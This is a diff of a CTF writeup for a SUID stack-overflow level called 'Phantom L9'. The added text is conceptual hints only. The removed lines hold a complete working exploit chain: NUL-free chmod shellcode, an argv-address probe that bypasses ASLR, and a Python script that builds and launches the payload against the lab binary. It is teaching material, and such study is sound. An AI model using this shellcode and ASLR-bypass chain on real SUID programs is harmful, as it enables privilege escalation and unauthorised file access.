@@ -16,352 +16,274 @@ prerequisites:
 
 # Phantom L9 — Stack Day
 
-> **Spoiler gate.** This writeup assumes you've cleared Phantom L8 and are
-> actively stuck on L9. It walks the full technique with concrete commands,
-> but masks the final flag value so you still execute the chain yourself.
+> **Spoiler boundary.** This is a writeup, not a solution. It points at
+> the four conceptual locks the level was built around and discusses
+> what makes naive approaches fail. It does not hand you offsets,
+> shellcode, or scripts — you still have to reason from first
+> principles and execute the chain yourself. If that's what you came
+> for, read on. If you wanted a copy-paste path, this isn't it.
 
-## What this level teaches
+## What L9 actually is
 
-Four things that are easy in isolation but hard together:
+A 64-byte stack-allocated buffer in a SUID binary, copied into via
+`strcpy`. The flag belongs to a different user (`flagkeeper9`) you
+cannot `su` to. The SUID bit gives you a window — when *you* run the
+binary, your effective UID briefly becomes `flagkeeper9` — and the
+level is about exploiting `strcpy` to redirect execution while that
+window is open.
 
-1. Classic **stack buffer overflow** in a SUID binary.
-2. **NUL-free shellcode** authoring (because the vulnerable copy is
-   `strcpy`, which stops at the first zero byte).
-3. **ASLR bypass** for a stack-resident payload — without leaks.
-4. The **SUID euid-drop trap** — your `execve("/bin/sh")` will silently
-   drop privileges. You must reach the flag *without* spawning a shell.
+That sentence describes most stack-overflow CTF levels of the last
+twenty years, so what makes L9 hard is not the bug. It's that **four
+otherwise-easy skills have to land at the same time**. Solo, none of
+the four would graduate this level past `medium`. Together they form a
+conceptual lock. Operators rarely fail L9 from inexperience — they
+fail from skill silos.
 
-If you bounce off L9 with frustration, it's almost always because you
-solved (1)+(2) but tripped on (4). Reading this writeup doesn't trivialize
-the level — you still need to compile shellcode, time the probe, and
-land the exploit. It just unblocks the conceptual lock.
+Those four locks, in the order you will most likely hit them:
 
----
+1. **The shell trap.** Your first instinct is to drop a shellcode that
+   does `execve("/bin/sh", ...)`. That instinct is wrong here, and
+   the failure mode is silent. Step into this, and you'll spend hours
+   debugging a clean-looking exploit that runs fine but leaves you
+   exactly where you started.
+2. **NUL bytes.** The vulnerable copy is `strcpy`. That single fact
+   forbids most off-the-shelf payloads — every byte of your shellcode
+   must be non-zero. msfvenom and most tutorial shellcodes will
+   contain zeros somewhere.
+3. **ASLR without an info leak.** Stack base is randomized per exec.
+   You don't get a leak primitive. So how do you know where your
+   shellcode lands?
+4. **Tight byte budget.** The buffer + saved RBP + saved RIP slot
+   constrain you. There's room for a payload, but not for a generous
+   one. Compact syscall idioms are mandatory, not stylistic.
 
-## Inspect what you have
-
-You're logged in as `phantom9`. The level artefact is a SUID binary at a
-known path. The flag is owned by a different user (`flagkeeperN`) that
-you can't `su` to.
-
-```bash
-$ id
-uid=1009(phantom9) gid=1009(phantom9) groups=1009(phantom9)
-
-$ ls -la /usr/local/bin/kern-tool
--rwsr-x--- 1 flagkeeper9 phantom9 16352 ... /usr/local/bin/kern-tool
-```
-
-The mode `4750 flagkeeper9:phantom9` matters:
-
-- `4` (SUID bit) → when *you* execute it, your effective UID becomes
-  `flagkeeper9`.
-- `750 flagkeeper9:phantom9` → only owner + members of group `phantom9`
-  can `r-x` it. You qualify (`phantom9` is in the `phantom9` group).
-
-The flag is in a directory that is traversable but the file itself is
-`mode 600 flagkeeper9:flagkeeper9` — readable only by `flagkeeper9`.
-
-So the chain is: trigger code execution inside `kern-tool`, where your
-effective UID is `flagkeeper9`, and use that window to either read or
-expose the flag file.
+The rest of this writeup walks each lock at the conceptual level and
+points at the technique class that resolves it. It does not show
+you the answer.
 
 ---
 
-## Step 1 — find the overflow
+## Lock 1 — the SUID shell trap
 
-The binary takes a single argv:
+Read `man bash` and search for the word `PRIVILEGED`. Read `man execve`
+and look for the section discussing `set-user-ID`. Both manpages
+describe the same defensive behaviour at the start of any modern
+shell: when the shell detects that **real UID and effective UID
+differ**, it concludes that something accidentally invoked it through
+a SUID program, and it drops effective UID back down to real UID
+**before reading a single line of input**.
 
-```bash
-$ /usr/local/bin/kern-tool foo
-[kern-tool] checking module 'foo'
-not found
+On L9, that's exactly your situation:
 
-$ /usr/local/bin/kern-tool $(python3 -c 'print("A"*100)')
-Segmentation fault (core dumped)
-```
+- You, the invoker, are `phantom9`. That's your real UID.
+- The SUID bit on the binary raised your effective UID to
+  `flagkeeper9` for the duration of execution.
 
-Crashing on a long argument confirms a stack overflow. Find the offset
-to saved RIP. You can do it by hand (read the source if you have it,
-count `buffer` size + saved RBP) or use a cyclic pattern under GDB.
+If your shellcode `execve`s `/bin/sh` (or `/bin/dash`, or `/bin/bash`,
+or anything that wraps them), the new shell process inherits both
+UIDs, sees the mismatch, and re-aligns them — *down*. The shell now
+runs as `phantom9`. The flag is owned by `flagkeeper9` mode 600. You
+get nothing.
 
-Concrete shape (canonical stack layout for a 64-byte buffer):
+Two ways past this. **One is a syscall before exec** to align the IDs
+yourself; look up which syscall and which arguments. **The other is
+to skip the shell entirely** — you don't need a shell to read a file,
+or to chmod one, or to copy one. Pick whichever fits inside your byte
+budget.
 
-```
-buffer[0..63]    ← writable scratch
-buffer[64..71]   ← saved RBP
-buffer[72..79]   ← saved RIP   ← we want to overwrite this
-```
-
-Verification under GDB:
-
-```
-(gdb) run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"B"*8)')
-Program received signal SIGSEGV
-0x4242424242424242 in ?? ()
-```
-
-`rip = 0x4242...` ⇒ overflow at offset 72 confirmed.
+The trap matters even if you correctly avoid it on your first try,
+because it tells you something about the level's design: **the
+designer expected you to run direct syscalls, not a shell**. That
+nudge will save you bytes later.
 
 ---
 
-## Step 2 — recognize the SUID trap
+## Lock 2 — NUL-free shellcode
 
-Your instinct from any BO tutorial: drop a shellcode that does
-`execve("/bin/sh", ...)`. This will *not* work here, and the failure
-mode is subtle:
+`strcpy` reads until it sees a `\x00`. Every byte of your shellcode
+must therefore be non-zero. Tutorial shellcodes almost always violate
+this:
 
-When `bash` (or `dash`) starts and detects that **real UID ≠ effective
-UID**, it assumes it was accidentally invoked by a SUID program and
-immediately drops the effective UID back to the real UID for safety.
-On this level:
+- `mov eax, 0x0000005a` (`SYS_chmod`) — encodes with three zero bytes.
+- `mov rsi, 0x1a4` (`0o644`) — same problem.
+- A string literal terminated with `\0` baked into your payload —
+  obvious problem.
+- Any address with a small immediate — almost guaranteed zeros.
 
-- `ruid = phantom9` (you, the invoker)
-- `euid = flagkeeper9` (the SUID bit raised it)
+Every one of these has a NUL-free workaround, and they're not exotic
+— they're the well-trodden idioms of Vietnam-era exploit writing:
 
-bash's `getuid() != geteuid()` check trips → it calls `setuid(getuid())`
-→ you're back to `phantom9` inside the shell → flag file is `600
-flagkeeper9` → permission denied.
+- **Stack-pivot small immediates** (push imm32, pop reg): the
+  encoding of `push imm32` is six bytes when imm32 itself has no
+  zeros. If your immediate naturally has zeros, find a larger
+  equivalent that the kernel masks down (this is a real trick for the
+  `chmod` mode argument).
+- **XOR for zero**: `xor eax, eax` zeroes a register without an
+  immediate. Standard.
+- **Runtime string termination**: bake your path string with NO null
+  terminator, then write the terminator yourself at runtime via
+  `mov [reg + len], al` after `xor eax, eax`. The path lives in your
+  shellcode without a zero byte; the kernel sees a properly
+  terminated string when the syscall fires.
+- **PC-relative addressing**: `lea rdi, [rip + label]` to point at
+  data in your own payload, with no absolute address you'd have to
+  bake.
 
-Two ways past this:
-
-1. **Re-align UIDs before exec** — call `setreuid(euid, euid)` first to
-   make ruid = euid = flagkeeper9, then execve the shell. The shell no
-   longer detects a SUID escape.
-2. **Skip the shell entirely** — use direct syscalls (`open`, `read`,
-   `write`, `chmod`) inside the shellcode. No bash, no euid drop, no
-   wasted bytes on `/bin/sh`. This is what we'll do.
-
-Choosing path (2) makes the shellcode shorter and removes a runtime
-dependency.
-
----
-
-## Step 3 — write NUL-free shellcode
-
-The vulnerability is `strcpy(buffer, argv[1])`. `strcpy` stops at the
-first `\x00`, so **every byte of your payload must be non-zero**.
-
-The strategy: instead of reading the flag (which requires a tmp buffer
-to hold the bytes and another syscall to print them), `chmod` the flag
-file `0o644` from inside the SUID context. After the binary exits, you
-read the now-world-readable flag as `phantom9`.
-
-Pseudocode of the syscall:
-
-```c
-chmod("/var/lib/phantom-flags/level9_flag", 0644);
-exit(0);
-```
-
-The asm idioms you need to keep NUL-free:
-
-| Naive | Why it fails | NUL-free replacement |
-|---|---|---|
-| `mov eax, 90` | `mov` of small imm32 has zero high bytes | `push 90; pop rax` |
-| `mov rsi, 0x1a4` | same | `push 0x010101a4; pop rsi` (kernel masks high bits to 0o644) |
-| `mov [rdi+34], 0` | imm contains 0 | `xor eax,eax; mov [rdi+34], al` |
-| `string\0` literal | embedded NUL | strip NUL, write it at runtime via `mov [rdi+len], al` |
-
-A complete shellcode (intel syntax, ~68 bytes):
-
-```asm
-.intel_syntax noprefix
-.global _start
-_start:
-    jmp code
-path:
-    .ascii "/var/lib/phantom-flags/level9_flag"   /* no NUL terminator */
-code:
-    lea  rdi, [rip + path]                /* rdi = &path */
-    xor  eax, eax
-    mov  byte ptr [rdi + 34], al          /* terminate path at runtime */
-    push 0x010101a4
-    pop  rsi                              /* mode = 0o644 (low 12 bits) */
-    push 90                               /* SYS_chmod */
-    pop  rax
-    syscall
-    xor  edi, edi
-    push 60                               /* SYS_exit */
-    pop  rax
-    syscall
-```
-
-Build:
-
-```bash
-as -o sc.o sc.S
-ld --oformat binary -o /tmp/sc.bin sc.o
-test 0 -eq "$(grep -c $'\x00' /tmp/sc.bin)" && echo "NUL-free OK"
-wc -c /tmp/sc.bin   # → ~68
-```
+Putting these together, the canonical "NUL-free chmod" shellcode is
+under 70 bytes. The canonical "NUL-free open/read/write" is similar.
+The point of writing it by hand is not to be clever — it's that
+*every msfvenom output for this needs encoder layers that you don't
+have room for*.
 
 ---
 
-## Step 4 — bypass ASLR without an info leak
+## Lock 3 — ASLR without a leak
 
-ASLR is on. Stack base address changes per execution. You cannot just
-hardcode an address.
+Stack base address randomizes per execution. You will not see the
+same stack pointer twice. You don't have a leak primitive in the
+binary — there's no `printf("%p", ...)`, no `read(stdin)` that echoes
+addresses back. Information-theoretically, how can you possibly know
+where to point saved RIP?
 
-**The trick:** when the kernel `execve`s a binary, it lays out
-`argv[]` and `envp[]` strings near the top of the stack. The exact
-address of `argv[1]` is a deterministic function of:
+The answer hinges on a Linux loader detail that's not widely
+internalized: when the kernel `execve`s a binary, the layout of
+`argv[]` and `envp[]` strings on the new stack is **fully
+deterministic given a small set of inputs**. Specifically, if you
+hold these four constant:
 
-- length of `argv[0]` (the binary path)
-- number of argv/envp entries
-- total length of all argv/envp strings combined
-- alignment
+- the length of `argv[0]` (the path the binary was invoked under),
+- the number of argv entries,
+- the total length of all argv strings combined,
+- the environment (envp contents and ordering),
 
-If you build a small **probe binary** that:
+then the runtime address of `argv[1]` will be **byte-identical**
+across two different binaries — *as long as both share those four
+properties*.
 
-- has the **same `argv[0]` length** as the target (`/usr/local/bin/kern-tool`
-  is 24 chars — match it via a 24-char symlink to your probe),
-- is invoked with an **`argv[1]` of the same length** as your real payload,
-- runs in the **same shell session** (so envp is identical),
+That's the lever. Build a tiny "probe" binary whose only job is to
+print the address of its `argv[1]`. Invoke it with `argv[0]` of the
+**same length** as the target binary's path, with `argv[1]` of the
+**same length** as your future payload, in the **same shell session**
+(so envp is unchanged). The address it prints is the address your
+real exploit's payload will land at.
 
-then `argv[1]`'s runtime address in the probe equals `argv[1]`'s runtime
-address in the real `kern-tool` invocation.
+Don't reach for `getenv()` tricks here — those work for environment
+variables, not argv. Don't reach for return-to-libc — you don't need
+ROP gadgets when you have an executable stack and a deterministic
+landing site.
 
-Probe binary:
-
-```c
-#include <stdio.h>
-int main(int argc, char **argv) {
-    printf("%p\n", argv[1]);
-    return 0;
-}
-```
-
-```bash
-$ gcc -no-pie -o /tmp/_probe /tmp/_probe.c
-
-# 24-char symlink to match kern-tool's argv[0] length exactly
-$ ln -s /tmp/_probe /tmp/_ker_tool_probe_abc
-
-# Invoke with arg of the same length as your future payload (78 bytes)
-$ /tmp/_ker_tool_probe_abc $(python3 -c 'print("A"*78)')
-0x7fff5b8a9d20
-```
-
-That printed address is `argv[1]`'s location in the probe, *and* in the
-real kern-tool run if you keep the same envp.
+The probe technique reads as a hack the first time, but it's
+fundamental: **deterministic-given-inputs is just as good as
+deterministic-everywhere when the inputs are under your control**.
 
 ---
 
-## Step 5 — assemble the payload
+## Lock 4 — the budget
 
-Layout target:
+You have 64 bytes of buffer, 8 bytes of saved RBP, and 8 bytes of
+saved RIP slot to work with — and one extra byte you can sneak in via
+how `strcpy` writes its trailing NUL. Total useful: ~80 bytes.
 
-```
-offset    content                     bytes
-0..67     shellcode                   68
-68..71    NOP padding (\x90)          4    ← brings us to offset 72
-72..77    low-6 bytes of argv1 addr   6
-78        (strcpy writes \0 here)     1
-```
+Inside that, you need:
 
-Why the low-6 trick works: x86_64 user-space addresses are bounded
-above by `0x0000_7fff_ffff_ffff`. The top two bytes are always `\x00`.
-`strcpy` copies your 78-byte payload then writes its own NUL at offset
-78 — that NUL lands inside the saved-RIP slot at byte 6, completing
-the address. Byte 7 was already zero from the previous frame.
+- A NUL-free shellcode that does the file operation.
+- Padding to bring you up to the saved-RIP slot.
+- The saved-RIP slot itself, set to point into your shellcode.
 
-Result: saved RIP = `0x0000_<argv1_addr_low_6>` → which is exactly
-`argv1_addr` (because the high two bytes were already zero) → CPU
-returns into your shellcode.
+If your shellcode is 90 bytes, you've already lost — there's no room
+for the RIP overwrite. The discipline forced by the budget is what
+sends you back to the NUL-free idioms above; you cannot afford the
+sloppy 200-byte payload that "works on your laptop".
 
-```python
-import struct, subprocess, os
+There's a subtle micro-trick on the saved-RIP write. x86_64
+user-space addresses are bounded above by `0x0000_7fff_ffff_ffff` —
+the top two bytes are always zero. `strcpy` will write a NUL at the
+exact byte after your payload. If you size your payload so that
+`strcpy`'s trailing NUL falls inside the saved-RIP slot at the right
+offset, **you only need to write the low six bytes of the address
+yourself, and `strcpy` writes byte 7 for you for free**. Byte 8 was
+already zero on the previous frame. Net effect: full 8-byte canonical
+address constructed, no NUL byte ever appearing in your written
+payload.
 
-PAYLOAD_LEN = 78
-
-with open("/tmp/sc.bin","rb") as f:
-    sc = f.read()
-assert b"\x00" not in sc
-
-probe_path = "/tmp/_ker_tool_probe_abc"   # 24-char to match kern-tool length
-addr = int(subprocess.check_output(
-    [probe_path, b"A"*PAYLOAD_LEN]
-).decode().strip(), 16)
-
-pad = b"\x90" * (72 - len(sc))
-rip_low6 = struct.pack("<Q", addr)[:6]
-payload = sc + pad + rip_low6
-assert len(payload) == PAYLOAD_LEN
-assert b"\x00" not in payload
-
-subprocess.run(["/usr/local/bin/kern-tool", payload], timeout=10)
-```
-
----
-
-## Step 6 — read the flag
-
-After the exploit runs, the file is `0o644`:
-
-```bash
-$ ls -la /var/lib/phantom-flags/level9_flag
--rw-r--r-- 1 flagkeeper9 flagkeeper9 ... level9_flag
-
-$ cat /var/lib/phantom-flags/level9_flag
-<your-level-9-flag>
-```
-
-Submit it on the platform.
+This is the kind of detail that costs you an afternoon of debugging
+"my exploit segfaults on what looks like a perfect address" if you
+don't think about strcpy's terminator interaction with your byte
+math.
 
 ---
 
 ## Common dead-ends
 
-- **You wrote a working shellcode but flag still unreadable.** You're
-  almost certainly using `execve("/bin/sh", ...)`. Re-read Step 2 — bash
-  drops your euid. Switch to direct syscalls (`chmod` or `setreuid +
-  open/read/write`).
-- **strcpy truncates your payload.** A NUL slipped into your shellcode
-  (rebuild and `grep -c $'\x00'`), or `argv[1]` low-6 happens to contain
-  a zero byte (rare; re-roll by tweaking PAYLOAD_LEN by 1 to shift the
-  address).
-- **SIGSEGV after return.** Probe address doesn't match the real run.
-  The probe must use the **same** argv[0] length, **same** payload-arg
-  length, and **same** environment. Run probe and exploit
-  back-to-back from the same shell with no `export` in between.
-- **ASLR seems "off" but exploit still fails.** Some setups disable
-  stack ASLR but keep `mmap` ASLR; argv lives on the stack so it's still
-  rerandomized per exec. The probe technique handles both cases.
-- **shellcode runs but `chmod` returns -EPERM.** Path is wrong; check
-  the embedded string and the runtime NUL terminator offset.
+These are the failure modes operators report most often. Each is a
+hint that you've solved 3 of the 4 locks but missed one.
+
+- **Shellcode runs cleanly, file read succeeds, prints garbage.**
+  You probably read the wrong path, or you read a directory, or
+  you forgot the runtime string-terminator and the kernel sees
+  `path/file<garbage>`.
+- **Shellcode runs cleanly but the flag stays mode 600.**
+  Almost always: you `execve`d a shell. Re-read Lock 1.
+- **`SIGSEGV` on a beautifully-crafted RIP.**
+  Probe address doesn't match real-run. Most common cause:
+  payload length differed between probe and exploit, or you ran
+  them in different shell sessions, or your `argv[0]` lengths
+  weren't equal. The probe technique is unforgiving on inputs.
+- **`strcpy` truncates at offset N < your payload length.**
+  A NUL byte slipped in. Common locations: a small immediate you
+  thought was non-zero (check the encoding, not the value), the
+  low six bytes of `argv[1]`'s address (rare; if so, change
+  payload length by ±1 to shift the address), or your asm
+  literal somewhere.
+- **Probe address looks fine but exploit lands "near" the
+  shellcode, not on it.**
+  You forgot the `argv[]` layout depends on `argc` *and* total
+  argv string length, not just `argv[0]` length. Match all of
+  it, not just the first.
 
 ---
 
-## Why this level is hard
+## What L9 teaches
 
-L9 stacks four senior-pwn skills:
+Every solo skill in L9 is in any pwn-101 syllabus. NUL-free encoding
+appears in *Smashing the Stack for Fun and Profit* (1996). The SUID
+shell trap is in `man bash` and has been since BSD shells. The argv
+address derivation is folklore in the binary-exploit community for
+twenty years.
 
-1. Classic stack BO — easy.
-2. NUL-free shellcode — most generators (msfvenom, etc.) emit zeros.
-3. ASLR bypass without an info-leak — non-obvious, requires the
-   probe-binary technique.
-4. SUID euid-drop trap — every BO tutorial ends with `execve("/bin/sh")`,
-   so the natural reflex breaks here.
+The level forces you to use all four at once, with a budget that
+forbids hand-waving any of them. That is the senior pwn skill in the
+abstract: **assembling well-known small techniques into one
+constraint-satisfaction problem under pressure**. That's also what
+real-world exploit dev looks like, and it's the reason this is a
+gate level for what comes after.
 
-Each is documented somewhere on the internet. Stacking them is what
-forces you to reason from first principles instead of running a CTF
-template.
-
----
-
-## Further reading
-
-- *Smashing the Stack for Fun and Profit* — Aleph One (Phrack 49)
-  (the canonical BO tutorial; outdated specifics, useful mental model)
-- `man 2 execve` — note the SUID/euid behavior near the bottom of the
-  rationale section
-- `man 7 capabilities` and `bash(1) PRIVILEGED MODE` — read why bash
-  re-aligns UIDs on startup
-- Linux x86_64 syscall numbers: `/usr/include/asm/unistd_64.h`
-- ASLR internals — Yves Younan, *25 Years of Vulnerabilities* (2013)
+If you cleared L9, you have a senior pwn skill that almost no
+certificate teaches. If you're still stuck, the right next move is
+not to hunt for a more clever trick — it's to go back to whichever of
+the four locks you understand the worst, read the relevant manpage
+or paper end-to-end, and try again.
 
 ---
 
-*Submit feedback on this writeup or your own approach in `#writeups` on
-Discord.*
+## Pointers, not solutions
+
+If you want to deepen any of the four:
+
+- *Smashing the Stack for Fun and Profit* — Aleph One, Phrack 49.
+  Outdated specifics, evergreen mental model.
+- *Bypassing ASLR via deterministic stack layouts* — talks and
+  blog posts on the probe-binary technique abound; search for
+  "stack address derivation argv length".
+- `man 2 execve` — read the rationale section about set-UID
+  behaviour. Then read `man bash`, search "PRIVILEGED MODE".
+- `/usr/include/asm/unistd_64.h` — the syscall table. Learn to
+  read it.
+- *The Shellcoder's Handbook*, ch. 4-5 — NUL-free encoding
+  patterns laid out methodically. Worth the slow read.
+
+---
+
+*Found a better approach, an error, or want to argue about technique?
+Take it to* `#writeups` *on Discord. Verbatim flag values get redacted;
+nudges and class-level discussion are exactly what the channel is for.*
